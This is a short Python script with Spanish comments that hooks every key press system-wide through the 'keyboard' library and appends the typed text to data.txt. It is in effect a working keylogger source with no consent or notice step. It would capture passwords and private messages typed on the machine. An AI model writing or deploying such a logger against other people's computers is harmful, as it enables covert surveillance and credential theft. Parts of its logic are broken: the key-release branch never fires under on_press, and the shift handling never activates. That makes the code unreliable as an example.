# pip install keyboard

import keyboard

# Un diccionario para almacenar el estado de las teclas no alfabéticas o numéricas
key_states = {}

def pressedKeys(key):
    with open('data.txt', 'a') as file:
        if key.name == 'space':
            file.write(' ')
        elif key.name == 'backspace':
            # Handle backspace if needed
            pass
        elif key.name == 'backslash':
            file.write(' ')
        elif key.name == 'enter':
            file.write('\n')  # Agrega una nueva línea al archivo
        elif key.name == 'shift':
            # No hagas nada si la tecla Shift está presionada
            pass
        elif not key.name.isalpha() and not key.name.isdigit():
            # Verifica si la tecla no es alfabética ni un número
            if key.event_type == keyboard.KEY_DOWN:
                # Verifica si la tecla está siendo presionada
                if key.name not in key_states or not key_states[key.name]:
                    # Verifica si la tecla no ha sido registrada recientemente
                    if 'shift' not in key_states or not key_states['shift']:
                        # Verifica si la tecla Shift no está presionada
                        file.write(key.name)
                    else:
                        # Si la tecla Shift está presionada, escribe la versión en mayúscula
                        file.write(key.name.upper())
                    key_states[key.name] = True
            elif key.event_type == keyboard.KEY_UP:
                # Cuando se libera la tecla, actualiza el estado
                key_states[key.name] = False
        else:
            file.write(key.name)

keyboard.on_press(pressedKeys)
keyboard.wait()

